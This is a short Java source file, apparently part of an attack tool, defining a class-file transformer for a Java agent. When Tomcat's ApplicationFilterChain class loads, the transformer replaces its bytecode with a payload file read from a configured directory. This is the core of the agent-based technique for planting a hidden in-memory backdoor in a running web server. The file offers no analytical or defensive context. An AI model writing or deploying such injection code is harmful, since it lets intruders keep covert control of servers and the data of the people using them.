package com.jun.apt;

import com.jun.apt.util.Utils;

import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class Transformer implements ClassFileTransformer {

    public byte[] transform(ClassLoader classLoader, String className, Class<?> c,
                            ProtectionDomain pd, byte[] b) {
        if (!className.equals("org/apache/catalina/core/ApplicationFilterChain")) {
            return null;
        } else {
            String dirPath = Utils.getProperty("dir_path");
            return Utils.getBytesFromFile(dirPath + "/" + AgentEntry.PAYLOAD_NAME);
        }
    }
}